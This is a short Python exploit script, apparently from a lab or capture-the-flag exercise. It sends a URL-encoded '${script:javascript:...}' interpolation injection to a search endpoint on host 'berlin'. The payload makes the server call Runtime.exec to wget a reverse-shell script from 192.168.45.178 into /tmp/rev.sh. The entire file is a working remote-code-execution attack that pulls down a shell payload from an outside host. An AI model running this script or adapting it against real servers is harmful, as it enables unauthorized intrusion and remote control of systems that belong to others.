import requests
from urllib.parse import quote

# Base URL and query parameter
base_url = "http://berlin:8080/search"
query_param = "${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://192.168.45.178/RevSh-simple-RHost-exec.sh -O /tmp/rev.sh')}"

# URL encode the query parameter
encoded_query = quote(query_param)

# Construct the full URL
full_url = f"{base_url}?query={encoded_query}"

# Make the GET request
response = requests.get(full_url)

# Print the response (or handle it as needed)
print(response.text)
